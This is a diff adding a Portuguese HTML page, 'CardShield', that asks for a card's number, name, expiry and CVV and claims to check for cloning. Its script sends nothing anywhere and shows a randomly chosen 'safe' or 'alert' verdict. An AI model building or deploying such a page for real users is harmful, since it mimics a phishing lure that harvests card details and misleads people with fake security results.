@@ -1,0 +1,246 @@
+<html><head><base href="https://cardverify.security/"><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>CardShield - Verificação de Cartão</title>
+    <style>
+    :root {
+      --primary: #2c3e50;
+      --secondary: #3498db;
+      --danger: #e74c3c;
+      --success: #2ecc71;
+    }
+    
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      margin: 0;
+      padding: 0;
+      background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+    
+    .header {
+      background-color: var(--primary);
+      color: white;
+      padding: 1rem;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+    }
+    
+    .container {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 2rem;
+      background: white;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0,0,0,0.1);
+    }
+    
+    .card-form {
+      display: grid;
+      gap: 1.5rem;
+    }
+    
+    .form-group {
+      display: flex;
+      flex-direction: column;
+      gap: 0.5rem;
+    }
+    
+    .form-group label {
+      font-weight: 600;
+      color: var(--primary);
+    }
+    
+    .form-group input {
+      padding: 0.8rem;
+      border: 2px solid #ddd;
+      border-radius: 5px;
+      font-size: 1rem;
+      transition: border-color 0.3s;
+    }
+    
+    .form-group input:focus {
+      border-color: var(--secondary);
+      outline: none;
+    }
+    
+    .submit-btn {
+      background-color: var(--secondary);
+      color: white;
+      padding: 1rem;
+      border: none;
+      border-radius: 5px;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: transform 0.2s, background-color 0.2s;
+    }
+    
+    .submit-btn:hover {
+      background-color: #2980b9;
+      transform: translateY(-2px);
+    }
+    
+    .result {
+      margin-top: 2rem;
+      padding: 1rem;
+      border-radius: 5px;
+      display: none;
+    }
+    
+    .result.success {
+      background-color: rgba(46, 204, 113, 0.2);
+      border: 1px solid var(--success);
+      color: var(--success);
+    }
+    
+    .result.danger {
+      background-color: rgba(231, 76, 60, 0.2);
+      border: 1px solid var(--danger);
+      color: var(--danger);
+    }
+    
+    .loader {
+      display: none;
+      width: 50px;
+      height: 50px;
+      border: 5px solid #f3f3f3;
+      border-top: 5px solid var(--secondary);
+      border-radius: 50%;
+      margin: 1rem auto;
+      animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    
+    </style>
+    </head>
+    <body>
+      <header class="header">
+        <h1>CardShield</h1>
+        <p>Sistema de Verificação de Cartões de Crédito</p>
+      </header>
+    
+      <main class="container">
+        <form class="card-form" id="cardForm">
+          <div class="form-group">
+            <label for="cardNumber">Número do Cartão</label>
+            <input type="text" id="cardNumber" maxlength="19" placeholder="1234 5678 9012 3456" required>
+          </div>
+    
+          <div class="form-group">
+            <label for="cardName">Nome no Cartão</label>
+            <input type="text" id="cardName" placeholder="NOME COMO APARECE NO CARTÃO" required>
+          </div>
+    
+          <div style="display: grid; grid-template-columns: 2fr 1fr; gap: 1rem;">
+            <div class="form-group">
+              <label for="expiry">Data de Validade</label>
+              <input type="text" id="expiry" placeholder="MM/AA" maxlength="5" required>
+            </div>
+    
+            <div class="form-group">
+              <label for="cvv">CVV</label>
+              <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+            </div>
+          </div>
+    
+          <button type="submit" class="submit-btn">Verificar Cartão</button>
+        </form>
+    
+        <div class="loader" id="loader"></div>
+        <div class="result" id="result"></div>
+      </main>
+    
+    <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const cardForm = document.getElementById('cardForm');
+      const loader = document.getElementById('loader');
+      const result = document.getElementById('result');
+      const cardNumberInput = document.getElementById('cardNumber');
+      const expiryInput = document.getElementById('expiry');
+    
+      // Formatação do número do cartão
+      cardNumberInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        value = value.replace(/(\d{4})/g, '$1 ').trim();
+        e.target.value = value;
+      });
+    
+      // Formatação da data de validade
+      expiryInput.addEventListener('input', function(e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+          value = value.substring(0,2) + '/' + value.substring(2);
+        }
+        e.target.value = value;
+      });
+    
+      cardForm.addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        // Mostrar loader
+        loader.style.display = 'block';
+        result.style.display = 'none';
+        
+        // Simular verificação
+        setTimeout(() => {
+          loader.style.display = 'none';
+          result.style.display = 'block';
+          
+          // Verificação aleatória para demonstração
+          const isValid = Math.random() > 0.5;
+          
+          if (isValid) {
+            result.className = 'result success';
+            result.innerHTML = `
+              <h3>✅ Cartão Verificado</h3>
+              <p>Não foram encontrados indícios de clonagem. Seu cartão parece estar seguro.</p>
+              <small>Última verificação: ${new Date().toLocaleString()}</small>
+            `;
+          } else {
+            result.className = 'result danger';
+            result.innerHTML = `
+              <h3>⚠️ Alerta de Segurança</h3>
+              <p>Detectamos atividades suspeitas. Recomendamos:</p>
+              <ul>
+                <li>Entre em contato com seu banco imediatamente</li>
+                <li>Bloqueie seu cartão temporariamente</li>
+                <li>Revise suas últimas transações</li>
+              </ul>
+              <small>Última verificação: ${new Date().toLocaleString()}</small>
+            `;
+          }
+        }, 2000);
+      });
+    });
+    
+    // Validação do número do cartão (Algoritmo de Luhn)
+    function isValidCreditCard(number) {
+      const digits = number.replace(/\D/g, '');
+      
+      if (digits.length !== 16) return false;
+      
+      let sum = 0;
+      let isEven = false;
+      
+      for (let i = digits.length - 1; i >= 0; i--) {
+        let digit = parseInt(digits[i]);
+        
+        if (isEven) {
+          digit *= 2;
+          if (digit > 9) {
+            digit -= 9;
+          }
+        }
+        
+        sum += digit;
+        isEven = !isEven;
+      }
+      
+      return sum % 10 === 0;
+    }
+    </script>
+    
+    </body></html>
